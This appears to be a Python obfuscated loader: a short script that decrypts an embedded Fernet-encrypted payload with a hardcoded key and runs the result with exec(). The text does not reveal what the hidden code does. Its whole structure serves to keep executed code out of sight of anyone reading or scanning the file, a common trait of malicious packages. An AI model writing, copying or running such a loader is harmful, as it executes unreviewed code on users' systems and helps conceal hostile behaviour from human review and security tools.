import base64
from cryptography.fernet import Fernet



payload = b'gAAAAABkEnJyDQRwhRctRWgKIhhNCDcqsj5gaQAEIihxiK2NtvYBMwZ2SBoEbwgZVTcOMNBbJRsPMqnjQbShR5S5rYNKzhZX5pZkz0mQYAPHj52Tm7WKLyqKvVYI6QlnoDpci6xTS3HBsCv5-mM5OLWpKGMzS_rru_Q72jl0JAMay0QcL5V9SwBcGLuSaC8dqFS8Pcgfh79kZnh_IfgMO7dBitOJPCDPW-_kzNfkMbccb4QOvuPYpaS6oZtMx7JbWuTUV6Hv8n9jpiecxofDeAmr4l3u_WG3rQ=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
